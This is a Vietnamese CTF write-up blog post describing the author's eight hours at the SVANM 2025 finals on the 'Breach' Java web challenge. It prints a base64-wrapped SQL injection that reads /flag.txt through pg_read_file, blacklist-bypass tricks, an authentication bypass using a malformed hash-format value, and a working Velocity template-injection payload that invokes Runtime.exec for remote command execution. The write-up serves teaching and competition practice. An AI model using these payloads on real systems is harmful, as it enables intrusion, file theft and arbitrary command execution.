---
title: 'SVANM2025: The End Of Beginning'
tags: [CTF]
slug: svanm-2025
date: 2025-11-16 17:28:53+0000
---

Mình nghĩ cũng phải 8 tháng sau bài wu gần nhất, không phải là do mình không chơi nữa, mà là do mình lười. Mãi sau khi thi xong SVANM, mình mới thấy là mình nên tập tành viết trở lại, nên đây sẽ là hành trình thi trong 8 tiếng của mình hơn là một writeup thuần túy.

Là một sinh viên năm 4(.5) chuẩn bị ra trường may mắn được lựa chọn để đi thi Sinh Viên An Ninh Mạng, tiền thân là Sinh Viên với An Toàn Thông tin. Cho nên đây là lần đầu cũng là lần cuối mình có thể tham gia cuộc thi này.

Điều đặc biệt là chung khảo năm nay là không thi theo kiểu Attack-Defend truyền thống mà sử dụng format năm 2020-2021: King Of The Hill. Nói nôm na thì nó là jeo, ai solve nhanh nhất sẽ được điểm của 1 round - 100 điểm. Các challenge có các cách patch khác nhau, các đội còn lại nếu muốn khai thác thì sẽ phải đợi round sau hoặc unpatch để attack.

Phần King of the Hill có 2 challenge web, mình nhìn thấy challenge 1 cần tài khoản Azure và review source code 1 hồi thấy khoai lang vão nên bỏ luôn 🗿. Do đó mình chỉ còn 1 chall web để giành giật điểm là challenge thứ 2: Breach
## Breach
Một challenge Java không outbound với docker cho flag vào cả 2 service web là db, khả năng sẽ có 2 cách để lấy flag:
![image](https://hackmd.io/_uploads/S1cWtxdlZl.png)<br>

Author cũng cung cấp cách để patch challenge là sẽ patch tại 2 file: patchme.groovy và patchme.jsp. Các file jsp sẽ inlcude file patchme.jsp, tương tự với groovy:
<br>![image](https://hackmd.io/_uploads/rkpdheOg-g.png)<br>
![image](https://hackmd.io/_uploads/Skoh2x_lZl.png)<br>

### SQL Injection In Function
Ngay sau khi bắt đầu cuộc thi, mình và teammate đã ngồi vào làm luôn challenge 2 và spot thấy sql injection tại detail_services.jsp:
```java!
<%
  String service_name = request.getParameter("service_name");
  if(service_name == null) service_name = "";
  if (!isSafeArgument(service_name)) {
    return;
  }
  PreparedStatement ps = null;
  ResultSet rs = null;

  try {
    String sql = "SELECT * FROM get_service_details_dynamic(?)";
    ps = conn.prepareStatement(sql);
    ps.setString(1, service_name);
    rs = ps.executeQuery();
%>
```
Function get_service_details_dynamic được nối chuỗi vào câu lệnh SELECT, ngon ồi:
```sql!
CREATE OR REPLACE FUNCTION get_service_details_dynamic(p_service_name VARCHAR)
RETURNS TABLE(
    service_name VARCHAR,
    feature VARCHAR,
    description TEXT
) AS $$
DECLARE
sql_query TEXT;
BEGIN
    -- Build the SQL string
    sql_query := 'SELECT s.name AS service_name, d.feature, d.description ' ||
                 'FROM public.detail_services d ' ||
                 'JOIN public.services s ON d.service_id = s.id ' ||
                 'WHERE s.name ILIKE ''%'||p_service_name||'%''';

    -- Execute the dynamic SQL and return results
RETURN QUERY EXECUTE sql_query;
END;
$$ LANGUAGE plpgsql;
```
Thật ra còn 2 function nối chuỗi nữa trong source code, nhưng có 1 function không gọi đến, còn 1 function nhận đầu vào là int nên mình cũng không để ý lắm mà xem param này bị filter cái gì tại `isSafeArgument(service_name)`
```java!
private String[] blackLists = {"pg_", "chr", "select", "insert", "update", "copy", "lo_", "program", "xml", ";"};
public boolean isSafeArgument(String input) {
    for (String keyword: blackLists) {
        if (input.toLowerCase().contains(keyword.toLowerCase())) {
            return false;
        }
    }
    return true;
}
```
Với kiểu filter này lowercase rồi contains thì khó ồi =)), mình ngồi loay hoay tìm trick 1 lúc không ra gì thì nhớ lại trong đống function được khai báo có 1 function không sử dụng trong code:
```sql!
CREATE OR REPLACE FUNCTION sdecode(encoded TEXT)
RETURNS TEXT AS $$
DECLARE
sql_query TEXT;
    result TEXT;
BEGIN
    sql_query := 'SELECT convert_from(decode('''||encoded||''', ''base64''), ''UTF8'')';
EXECUTE sql_query INTO result;
RETURN result;
END;
$$ LANGUAGE plpgsql;
```
Thay vì lọ mọ đi kiếm trick bypass, mình sẽ gọi đến sdecode để sqli vào trong hàm này, với ý tưởng là payload truyền vào sẽ được base64 xong rồi mới đưa vào sdecode:
```sql!
it_db=# select convert_from(decode('UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==', 'base64'), 'UTF8');
                      convert_from
---------------------------------------------------------
 QQ==', 'base64'), 'UTF8')||cast(version() as numeric)--
(1 row)

it_db=# select sdecode(convert_from(decode('UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCh2ZXJzaW9uKCkgYXMgbnVtZXJpYyktLQ==', 'base64'), 'UTF8'));
ERROR:  invalid input syntax for type numeric: "PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit"
CONTEXT:  SQL statement "SELECT convert_from(decode('QQ==', 'base64'), 'UTF8')||cast(version() as numeric)--', 'base64'), 'UTF8')"
PL/pgSQL function sdecode(text) line 7 at EXECUTE
```
Với việc flag nằm ở /flag.txt, mình chỉ cần thay version() thành pg_read_file() là có thể leak flag qua error based rồi:
```sql!
it_db=# select sdecode(convert_from(decode('UVE9PScsICdiYXNlNjQnKSwgJ1VURjgnKXx8Y2FzdCgoc2VsZWN0IHBnX3JlYWRfZmlsZSgnL2ZsYWcudHh0JykpIGFzIG51bWVyaWMpLS0=', 'base64'), 'UTF8'));
ERROR:  invalid input syntax for type numeric: "CSCV2025{fake_flag_for_testing}"
CONTEXT:  SQL statement "SELECT convert_from(decode('QQ==', 'base64'), 'UTF8')||cast((select pg_read_file('/flag.txt')) as numeric)--', 'base64'), 'UTF8')"
PL/pgSQL function sdecode(text) line 7 at EXECUTE
```
Mình solve khá muộn, vẫn sau 2 team nên sau khi ra flag ở challenge phải giành giật submit mấy round mới ăn được 1 round:
![image](https://hackmd.io/_uploads/Sk0M-W_ebl.png)<br>
Các round đầu thì các vẫn chưa có patch nào, cho đến khi mình nhìn mặt được payload và bắt đầu patch chuẩn chỉ thì bị 1 team unshield xong đớp cái patch. Thành ra giờ mình phải bypass cái patch của chính mình, hoặc là đi tìm bug khác.
Trong lúc submit, mình và team mình liên tục submit chậm hơn các team khác không chỉ ở category web mà còn ở các chall pwn. Lúc thì bị rate limit, lúc thì `owner already updated!!!` tức đã có team khác submit rồi, chầy chật mãi mới có thể giành lại được thì cũng không tồn tại được quá 1 2 round. Team mình khá cay và phải liên tục sửa script, thêm sleep để không bị ratelimit nhưng vẫn không ăn thua 🗿
Về sau, có một số cách patch mà teammate mình đã bypass như:
```
)) => )/**/)
' and và ' or => '||(payload)||'
convert => encode
'string' => $$string$$
$$string$$ => $quote$string$quote$
```
Ref: https://hackmd.io/@Chivato/rkHvEMHUI
Tại những round cuối, khi bản patch đã khá chặt thì chỉ còn team mình và 1 team khác có thể bypass patch nên 2 anh em cứ chia nhau mỗi người 1 round. Vì mình không biết payload của họ, cũng như không muốn để lộ payload của bản thân nên mình đã chọn sử dụng lại bản patch mà chỉ 2 đội có thể bypass được, khá cồng kềnh. Và đến gần kết thúc cuộc thi (chắc còn 3 round), mình mới hơi lờ mờ tìm được đường để exploit vuln thứ 2.
### Bypass Auth to SSTI
#### Bypass Authen
Để phân tích được vuln này thì mình bắt buộc cần phải setup debug, mình ote lại một vài bước như sau:
- Chỉnh lại Dockerfile của tomcat
```dockerfile!
ENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
EXPOSE 5005
```
- Bỏ service nginx để vào thẳng tomcat cho tiện, đồng thời expose port 5005 ra ngoài
```dockerfile!
web:
container_name: web
build:
  context: .
  dockerfile: web/Dockerfile
volumes:
  - ./flag.txt:/flag.txt:ro
restart: unless-stopped
ports:
  - "8080:8080"
  - "5005:5005"
depends_on:
  - postgres
networks:
  - internet
  - no-internet
```
- Khi đã thấy remote debug connected mà đặt breakpoint không ăn thì có thể là do chưa chọn class là code base, để set thì mình vào Project Structure. Tại tab Modules chọn phần Dependencies, thêm folder classes vào với option là JARs or Directories là oke:<br>
![image](https://hackmd.io/_uploads/HktCoGueWg.png)<br>
Trong web.xml khai báo các file truy cập từ đường dẫn `/admin` đều sẽ đi qua 2 class AuthFilter và WafFilter:
```xml!
<filter-mapping>
    <filter-name>AuthFilter</filter-name>
    <url-pattern>/admin/*</url-pattern>
</filter-mapping>
<filter-mapping>
    <filter-name>WafFilter</filter-name>
    <url-pattern>/admin/*</url-pattern>
</filter-mapping>
```
Class AuthFilter yêu cầu mỗi request đi vào đều có username và password, biến format là cách thức hash mật khẩu để so khớp, nếu không có mặc định là sha1:
<br>![image](https://hackmd.io/_uploads/ByXK6zuxZl.png)<br>
Nếu như format được truyền vào thì phải nằm trong `sha1,md5,sha256,sha512`, nếu không sẽ báo lỗi ngay:
![image](https://hackmd.io/_uploads/B19i6fdeZl.png)<br>
Check chán chê r mới đến đoạn check thông tin người dùng tại InMemoryUserDB#verifyUser:
![image](https://hackmd.io/_uploads/Syje0G_lZe.png)<br>
Hàm này check username trước bằng cách lấy password của user tương ứng. Sau đó so khớp mật khẩu lưu trữ với mật khẩu truyền vào được hash bằng format ta điều chỉnh. Đồng thời this.users là một map chứa mỗi admin, nên loại bỏ việc crack hash:
![image](https://hackmd.io/_uploads/ByvU0MdeWx.png)<br>
Qua 1 vòng if, tiếp tục kiểm tra thuộc tính protect là true thì kiểm tra role, không phải admin thì trả về lỗi role, cuối cùng nếu dpFilter là true thì mới tiếp tục xử lý:
<br>![image](https://hackmd.io/_uploads/rknUWmOx-l.png)<br>

Thuộc tính protect được set bằng logic sau:
- Lấy URI của request, split từng thư mục theo dấu "/"
- Set page_type mặc định rỗng, nếu như tên file có nhiều hơn 2 dấu . thì lấy extension sau dấu chấm cuối cùng
- Check nếu page_type nằm trong protectedPages thì set là true, không thì là false
Mặc định truyền vào file thông thường như: /admin/index.tpl thì mặc định page_type là "" => chuỗi nào mà chả contains "" nên mặc định protect là true:
![image](https://hackmd.io/_uploads/SJXgZXOx-l.png)<br>
Như vậy, để bypass auth thì phải không được để doFilter là false, để làm được điều đó thì:

***Bypass verifyUser***

Debug kỹ hơn, ta thấy vòng if đầu có block try/catch, mà nếu như rơi vào catch thì doFilter sẽ không bị set thành false:
```java!
if (username != null && password != null) {
    try {
        String format = request.getParameter("format");
        if (format == null || format.isEmpty()) {
            format = "sha1";
        }

        if (!"sha1,md5,sha256,sha512".contains(format)) {
            msg = "format does not support";
            doFilter = false;
            resp.sendRedirect("/home/_error.page?errorMsg=" + URLEncoder.encode(msg, StandardCharsets.UTF_8));
        } else {
            boolean auth = this.userDB.verifyUser(username, password, format);
            try {
                if (auth) {
                    ...
                } else {
                    String msg = "auth failed1!";
                    doFilter = false;
                    resp.sendRedirect("/home/_error.page?errorMsg=" + URLEncoder.encode(msg, StandardCharsets.UTF_8));
                }
            } catch (Exception var17) {
                String msg = "auth failed2!";
                doFilter = false;
                resp.sendRedirect("/home/_error.page?errorMsg=" + URLEncoder.encode(msg, StandardCharsets.UTF_8));
            }
        }
    } catch (Exception var18) {
        var18.printStackTrace();
        System.out.println("error trying to authenticate: " + var18.getMessage());
}
```
Câu hỏi là làm thế nào để raise Exception var18 mà không bị rơi vào các exception khác? Câu trả lời sẽ nằm ở biến format, đoạn kiểm tra đầu vào của format có vấn đề, cụ thể là dòng:
```java!
if (!"sha1,md5,sha256,sha512".contains(format))
```
Giá trị được check để **contains** trong chuỗi kia, nếu như ta truyền vào `,sha512` thì sao?
Đoạn check if contains sẽ được pass, chương trình gọi đến verifyUser:
![image](https://hackmd.io/_uploads/SyljEX_g-x.png)<br>
Tại đây mật khẩu được lấy từ user tương ứng, không sẽ return false => auth failed1! Nên username truyền vào cần phải là `admin`. Hàm check tiếp tục nhảy vào hàm hashPassword:
![image](https://hackmd.io/_uploads/BkIyVQOlZl.png)<br>
Hàm hashPassword sẽ check format truyền vào có phải một thuật toán hash hợp lệ trong MessageDigest không:
![image](https://hackmd.io/_uploads/Bk_W4QOgZl.png)<br>
Do `,sha512` không valid nên sẽ raise exception `,sha512 MessageDigest not available`, từ đó bypass được đoạn whitelist if đầu:
![image](https://hackmd.io/_uploads/HyOGVXdlWe.png)<br>
***Set protect = false***

Xem lại web.xml, các file có extension như sau được handle bởi class EditContentParser
```xml!
<servlet>
    <servlet-name>EditContentParser</servlet-name>
    <servlet-class>io.breach.EditContentParser</servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>EditContentParser</servlet-name>
    <url-pattern>*.groovy</url-pattern>
</servlet-mapping>
<servlet-mapping>
    <servlet-name>EditContentParser</servlet-name>
    <url-pattern>*.page</url-pattern>
</servlet-mapping>
<servlet-mapping>
    <servlet-name>EditContentParser</servlet-name>
    <url-pattern>*.tpl</url-pattern>
</servlet-mapping>
<servlet-mapping>
    <servlet-name>EditContentParser</servlet-name>
    <url-pattern>*.htm</url-pattern>
</servlet-mapping>
```
Khi gặp các file này, class call method service, thực hiện parse URI để lấy ra tên file cần hiển thị. Nhưng vấn là ở đây page_type lại được lấy là phần tử tiên sau dấu chấm, ngược lại với logic xử lý `protect`:
![image](https://hackmd.io/_uploads/rkWIDQOxZe.png)<br>
Để `protect` là false, ta cần phải truyền vào file có 2 extension:
- Extension thứ 2 không phải là groovy => page, tpl, htm đều được
- Extension thứ nhất là extension đúng của file cần truy cập

Kết hợp cả 2 điều kiện, ta có request bypass authen để truy cập file /admin/index.html:
![image](https://hackmd.io/_uploads/SybIOXdeWg.png)<br>
#### SSTI In Velocity
Trong các file có thể truy cập, tồn tại editPage.groovy cho phép tạo file .page có nội dung tùy ý truy cập được từ webroot => SSTI Velocity:
![image](https://hackmd.io/_uploads/Sk_ktm_xWg.png)<br>
Vấn đề còn lại là bypass đống blacklist này nữa thôi:
```java!
private static final List<String> BLACKLIST = Arrays.asList("runtime", "processbuilder", "eval", "forName", "scriptEngine", "parse", "include");

private boolean containsBlacklisted(String input) {
    if (input == null) {
        return false;
    } else {
        String lower = input.toLowerCase();
        Iterator var3 = BLACKLIST.iterator();

        String forbidden;
        do {
            if (!var3.hasNext()) {
                return false;
            }

            forbidden = (String)var3.next();
        } while(!lower.contains(forbidden.toLowerCase()));

        return true;
    }
}
```
Đa số các payload Velocity SSTI đều dùng forName để call class, để bypass thì mình đã chọn sử dụng classloader. Sau một hồi fuzz tùm lum, mình tìm được object $request chứa instance của class RequestFacade:<br>
![image](https://hackmd.io/_uploads/H1DecXOlbe.png)<br>
Từ đây có thể call đến object URLClassLoader thông qua payload `$request.servletContext.class.classLoader`:
![image](https://hackmd.io/_uploads/BJH497ugZe.png)<br>
Việc khó đã làm được, giờ mình sẽ dùng nó để load class java.lang.Runtime, lấy command từ header 1337:
```java!
#set($cl = $request.servletContext.class.classLoader)
#set($rt = $cl.loadClass("java.lang.Run"+"time"))
#set($g = $rt.getMethod("getR"+"untime",null))
#set($r = $g.invoke(null,null))
#set($cmd = $request.getHeader("1337"))
#set($exec = $rt.getMethod("exec",$cl.loadClass("java.lang.String")))
#set($p = $exec.invoke($r,$cmd))
#set($is = $p.getInputStream())
#set($scClass = $cl.loadClass("java.util.Scanner"))
#set($sc = $scClass.getConstructor($cl.loadClass("java.io.InputStream")).newInstance($is))
#set($del = $scClass.getMethod("useDelimiter", $cl.loadClass("java.lang.String")))
#set($tmp = $del.invoke($sc, "\\A"))
#set($next = $scClass.getMethod("next"))
$next.invoke($sc)
```
![image](https://hackmd.io/_uploads/r1VF57_g-e.png)<br>
Finally, RCE:<br>
![image](https://hackmd.io/_uploads/rkD95Xdx-g.png)<br>
Đớp flag trên server:<br>
![image](https://hackmd.io/_uploads/r13xo7ugbl.png)<br>
Ra đến bước này thì cuộc thi cũng kết thúc rồi, thôi thì +1 kiến thức vậy
## Kết thúc
Trong khoảng thời gian 8 tiếng, ngoài challenge web2 thì mình có vọc Lucky Star nữa mà không confirm được đã RCE con Sharepoint hay chưa, coi như là tốn thêm thời gian mà không có thành quả gì. 
Ngậm ngùi kết thúc ở vị trí thứ 6, mình cũng chỉ biết tự trách bản thân thôi 🗿
![image](https://hackmd.io/_uploads/S1PUdlulZx.png)<br>
Đây là bài học cho bản thân về việc không chuẩn bị kĩ trước một format thi mới, cũng như sự thiếu quyết đoán khi sử dụng tool unshield,... dẫn đến kết quả không như mong muốn. Hi vọng rằng các khóa sau sẽ không mắc phải sai lầm như mình nữa.